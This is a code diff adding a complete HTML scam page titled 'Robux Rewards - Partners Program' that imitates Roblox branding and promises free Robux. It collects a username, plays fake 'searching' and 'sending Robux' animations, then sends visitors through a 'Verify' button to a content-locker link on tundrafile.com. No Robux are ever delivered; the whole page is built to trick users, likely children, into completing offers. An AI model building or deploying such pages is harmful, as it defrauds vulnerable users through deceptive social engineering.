@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Robux Rewards - Partners Program</title>
+    <style>
+        /* CSS Core Baseline Reset */
+        * { 
+            box-sizing: border-box; 
+            margin: 0; 
+            padding: 0; 
+            font-family: "Gotham SSm A", "Gotham SSm B", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            /* FIXED: Applied precise overlay opacity to make elements pop across all screen sizes */
+            background: linear-gradient(rgba(14, 14, 14, 0.75), rgba(14, 14, 14, 0.75)), 
+                        url('./bg.jpg'),
+                        #121212;
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center top; /* Position shifted to top to pin the background header */
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: flex-start;
+            color: #ffffff; 
+            padding: 0 14px 40px 14px;
+        }
+
+        /* Seamless Component Wrapper Container */
+        .wrapper {
+            width: 100%;
+            max-width: 440px;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.85);
+            border-radius: 16px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            /* Premium Transparent Glass Look to show background details */
+            background: rgba(25, 25, 25, 0.75);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            
+            /* DESKTOP DEFAULT POSITION: Perfectly below the desktop header background */
+            margin-top: 140px; 
+            transition: margin-top 0.2s ease;
+        }
+        
+        /* Central Operations Main Control Panel Display Box */
+        .box { 
+            background: rgba(20, 20, 20, 0.65);
+            width: 100%; 
+            padding: 40px 28px; 
+            text-align: center; 
+            min-height: 380px; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+        }
+
+        /* Branding Layout Assets */
+        .roblox-logo { 
+            width: 135px; 
+            margin-bottom: 20px; 
+            user-select: none;
+            filter: invert(1);
+        }
+        
+        .sub-text { 
+            color: #cccccc; 
+            font-size: 14px; 
+            margin-bottom: 28px; 
+            line-height: 1.5; 
+            max-width: 360px;
+        }
+        
+        .input-label { 
+            font-weight: 700; 
+            font-size: 19px; 
+            margin-bottom: 18px; 
+            color: #ffffff; 
+            letter-spacing: 0.3px;
+        }
+        
+        /* Dark Velvet Input Form Asset */
+        input[type="text"] { 
+            width: 100%; 
+            padding: 15px; 
+            background: rgba(5, 5, 5, 0.85); 
+            border: 1px solid rgba(255, 255, 255, 0.1); 
+            border-radius: 8px; 
+            color: #ffffff; 
+            text-align: center; 
+            font-size: 16px; 
+            margin-bottom: 22px; 
+            outline: none; 
+            font-weight: 600;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+        input[type="text"]:focus { 
+            border-color: #00b06f; 
+            box-shadow: 0 0 10px rgba(0, 176, 111, 0.3);
+        }
+        
+        /* Standard Green Active Buttons */
+        .btn { 
+            width: 100%; 
+            padding: 15px; 
+            background: #00b06f; 
+            color: #ffffff; 
+            border: none; 
+            border-radius: 8px; 
+            font-size: 17px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            text-transform: uppercase;
+            transition: background 0.15s ease, transform 0.1s ease;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 4px 15px rgba(0, 176, 111, 0.3);
+        }
+        .btn:hover { 
+            background: #00945d; 
+            box-shadow: 0 6px 20px rgba(0, 148, 93, 0.4);
+        }
+        .btn:active {
+            transform: scale(0.98);
+        }
+        
+        /* Application States Rendering Architecture */
+        .step { 
+            display: none; 
+            width: 100%; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+        }
+        .step.active { 
+            display: flex; 
+        }
+        
+        /* Animated Pulsing/Blinking Vector Hexagon Spinner Module */
+        .roblox-spinner-box {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 22px;
+            animation: pulseBlink 1.2s ease-in-out infinite;
+        }
+        
+        .searching-text { 
+            font-size: 16px; 
+            color: #ffffff; 
+            font-weight: 500; 
+            letter-spacing: 0.5px;
+        }
+        
+        /* Package Cards Layout - Strict Target Spacing */
+        .pkg-list { 
+            display: flex; 
+            flex-direction: column; 
+            gap: 12px; 
+            width: 100%; 
+        }
+        
+        /* Emerald Reward Package Card Blocks with Zoom-In Hover Transition Effect */
+        .pkg-item { 
+            width: 100%; 
+            padding: 15px; 
+            background: #00b06f; 
+            border-radius: 8px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 12px; 
+            font-size: 19px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            color: #ffffff;
+            transition: transform 0.2s cubic-bezier(0.4, 0, 0.2, 1), background 0.15s ease;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+        
+        /* Smooth Scale Action Trigger on Mouse Hover */
+        .pkg-item:hover { 
+            transform: scale(1.03); 
+            background: #00945d; 
+        }
+        
+        /* Exact Official Stylized Robux Custom Hexagon SVG Graphics */
+        .pkg-hexagon-svg {
+            width: 22px;
+            height: 22px;
+            fill: #ffffff;
+        }
+        
+        /* Blinking Animation Framework Rules */
+        @keyframes pulseBlink { 
+            0% { transform: scale(0.92); opacity: 0.4; } 
+            50% { transform: scale(1.04); opacity: 1; } 
+            100% { transform: scale(0.92); opacity: 0.4; } 
+        }
+
+        /* ---------------------------------------------------- */
+        /* FIXED: DYNAMIC RESPONSIVE BREAKPOINTS FOR ALL MOBILES */
+        /* ---------------------------------------------------- */
+        
+        /* Target Mobile Screen Layout Configurations (Android & iOS) */
+        @media screen and (max-width: 480px) {
+            body {
+                /* Disabling fixed mode on mobile ensures fluid scrolling and stable backgrounds */
+                background-attachment: scroll; 
+                padding: 0 10px 40px 10px;
+            }
+            .wrapper {
+                /* Dynamically scales down the space so the box starts exactly under the background layout */
+                margin-top: 85px; 
+                max-width: 100%;
+                border-radius: 12px;
+            }
+            .box {
+                padding: 30px 20px;
+                min-height: 350px;
+            }
+            .roblox-logo {
+                width: 110px;
+                margin-bottom: 15px;
+            }
+            .input-label {
+                font-size: 17px;
+                margin-bottom: 14px;
+            }
+            .sub-text {
+                font-size: 13px;
+                margin-bottom: 22px;
+            }
+            input[type="text"], .btn, .pkg-item {
+                padding: 13px;
+                font-size: 15px;
+            }
+        }
+
+        /* Micro-optimization for Ultra Small Screens (e.g., iPhone SE) */
+        @media screen and (max-width: 360px) {
+            .wrapper {
+                margin-top: 75px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="wrapper">
+        <div class="box">
+            
+            <div class="step active" id="step1">
+                <img class="roblox-logo" src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox">
+                <p class="sub-text">Robux allows you to purchase upgrades for your avatar or buy special abilities in experiences</p>
+                <p class="input-label">Enter your Username</p>
+                <input type="text" id="username" placeholder="type your user ..." autocomplete="off" spellcheck="false">
+                <button class="btn" onclick="processUsername()">Continue</button>
+            </div>
+
+            <div class="step" id="step2">
+                <svg class="roblox-spinner-box" viewBox="0 0 100 100">
+                    <polygon points="50,5 95,25 95,75 50,95 5,75 5,25" fill="#00b06f"/>
+                    <rect x="35" y="35" width="30" height="30" fill="#1c1c1c" transform="rotate(15 50 50)"/>
+                </svg>
+                <p class="searching-text" id="status-text">Searching for username...</p>
+            </div>
+
+            <div class="step" id="step3">
+                <div class="pkg-list">
+                    <div class="pkg-item" onclick="selectPackage('1700')">
+                        <svg class="pkg-hexagon-svg" viewBox="0 0 100 100"><polygon points="50,5 95,25 95,75 50,95 5,75 5,25"/><rect x="38" y="38" width="24" height="24" fill="#00b06f" transform="rotate(15 50 50)"/></svg>
+                        1700
+                    </div>
+                    <div class="pkg-item" onclick="selectPackage('4500')">
+                        <svg class="pkg-hexagon-svg" viewBox="0 0 100 100"><polygon points="50,5 95,25 95,75 50,95 5,75 5,25"/><rect x="38" y="38" width="24" height="24" fill="#00b06f" transform="rotate(15 50 50)"/></svg>
+                        4500
+                    </div>
+                    <div class="pkg-item" onclick="selectPackage('10000')">
+                        <svg class="pkg-hexagon-svg" viewBox="0 0 100 100"><polygon points="50,5 95,25 95,75 50,95 5,75 5,25"/><rect x="38" y="38" width="24" height="24" fill="#00b06f" transform="rotate(15 50 50)"/></svg>
+                        10000
+                    </div>
+                    <div class="pkg-item" onclick="selectPackage('50000')">
+                        <svg class="pkg-hexagon-svg" viewBox="0 0 100 100"><polygon points="50,5 95,25 95,75 50,95 5,75 5,25"/><rect x="38" y="38" width="24" height="24" fill="#00b06f" transform="rotate(15 50 50)"/></svg>
+                        50000
+                    </div>
+                </div>
+            </div>
+
+            <div class="step" id="step4">
+                <svg class="roblox-spinner-box" viewBox="0 0 100 100">
+                    <polygon points="50,5 95,25 95,75 50,95 5,75 5,25" fill="#00b06f"/>
+                    <rect x="35" y="35" width="30" height="30" fill="#1c1c1c" transform="rotate(15 50 50)"/>
+                </svg>
+                <p class="searching-text" id="sending-text">Sending Robux to...</p>
+            </div>
+
+            <div class="step" id="step5">
+                <img class="roblox-logo" src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox">
+                <p class="sub-text" style="font-size: 15px; color: #ffffff; margin-bottom: 25px;">Please click on the button below and complete 1 task to verify that you're not a robot!</p>
+                <button class="btn" onclick="openNetworkLocker()">
+                    <svg class="pkg-hexagon-svg" viewBox="0 0 100 100"><polygon points="50,5 95,25 95,75 50,95 5,75 5,25"/><rect x="38" y="38" width="24" height="24" fill="#00b06f" transform="rotate(15 50 50)"/></svg>
+                    Verify
+                </button>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        let userName = "";
+        let selectedAmount = "";
+
+        function showStep(stepId) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById(stepId).classList.add('active');
+        }
+
+        function processUsername() {
+            userName = document.getElementById('username').value.trim();
+            if(userName === "") { alert("Please enter your username!"); return; }
+            
+            showStep('step2');
+            document.getElementById('status-text').innerText = `Searching for ${userName}...`;
+            
+            setTimeout(() => {
+                showStep('step3');
+            }, 2500);
+        }
+
+        function selectPackage(amount) {
+            selectedAmount = amount;
+            showStep('step4');
+            document.getElementById('sending-text').innerText = `Sending ${selectedAmount} Robux to ${userName}...`;
+            
+            setTimeout(() => {
+                showStep('step5');
+            }, 3000);
+        }
+
+        function openNetworkLocker() {
+            /* TundraFile Direct Integrated Endpoint Routing */
+            window.location.href = "https://tundrafile.com/1895807";
+        }
+    </script>
+</body>
+</html>
